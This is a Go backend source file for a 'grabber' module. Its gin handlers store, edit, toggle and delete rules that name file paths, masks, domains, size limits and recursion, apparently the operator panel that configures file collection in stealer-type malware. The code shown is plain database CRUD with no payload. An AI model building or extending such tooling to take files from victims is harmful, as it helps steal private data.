package grabber

import (
	"net/http"

	database "../../db"
	lggr "../../logger"
	login "../login"

	"github.com/gin-gonic/gin"
)

var db = database.Connect()
var logger = lggr.Log()

type GrabberData struct {
	Id        int    `db:"Id" json:"id"`
	Path      string `db:"Path" json:"path"`
	Mask      string `db:"Mask" json:"mask"`
	Domains   string `db:"Domains" json:"domains"`
	Exeptions string `db:"Exeptions" json:"exeptions"`
	FileSize  int    `db:"FileSize" json:"file_size"`
	Recursive bool   `db:"Recursive" json:"recursive"`
	Status    bool   `db:"Status" json:"status"`
}

func GetGrabberRules() (grabberRules []GrabberData) {
	err := db.Select(&grabberRules, "SELECT * FROM `grabber` ORDER BY `Id` DESC")
	if err != nil {
		logger.Println("grabber.GetGrabberRules: ", err)
	}

	return grabberRules
}

func GetRules(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("grabber.GetRules: unauthorized user: ", ctx.ClientIP())
		return
	}

	rulesData := GetGrabberRules()
	if len(rulesData) < 1 {
		ctx.JSON(http.StatusOK, "")
		return
	}

	ctx.JSON(http.StatusOK, rulesData)
}

type GrabberRuleAction struct {
	Cookie string      `json:"cookie"`
	Data   GrabberData `json:"form"`
}

func Create(ctx *gin.Context) {
	var rule GrabberRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("grabber.Create: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("INSERT INTO `grabber` (`Path`, `Mask`, `Domains`, `Exeptions`, `FileSize`, `Recursive`, `Status`) VALUES (?, ?, ?, ?, ?, ?, ?)",
		rule.Data.Path,
		rule.Data.Mask,
		rule.Data.Domains,
		rule.Data.Exeptions,
		rule.Data.FileSize,
		rule.Data.Recursive,
		rule.Data.Status,
	)

	if err != nil {
		logger.Println("grabber.Create: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func Edit(ctx *gin.Context) {
	var rule GrabberRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("grabber.Edit: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("UPDATE `grabber` SET `Path` = ?, `Mask` = ?, `Domains` = ?, `Exeptions` = ?, `FileSize` = ?, `Recursive` = ?, `Status` = ? WHERE `Id` = ?",
		rule.Data.Path,
		rule.Data.Mask,
		rule.Data.Domains,
		rule.Data.Exeptions,
		rule.Data.FileSize,
		rule.Data.Recursive,
		rule.Data.Status,
		rule.Data.Id,
	)

	if err != nil {
		logger.Println("grabber.Edit: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func Run(ctx *gin.Context) {
	var rule GrabberRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("grabber.Run: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("UPDATE `grabber` SET `Status` = NOT `Status` WHERE `Id` = ?", rule.Data.Id)
	if err != nil {
		logger.Println("grabber.Run: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func Delete(ctx *gin.Context) {
	var rule GrabberRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("grabber.Delete: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("DELETE FROM `grabber` WHERE `Id` = ?", rule.Data.Id)
	if err != nil {
		logger.Println("grabber.Delete: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}
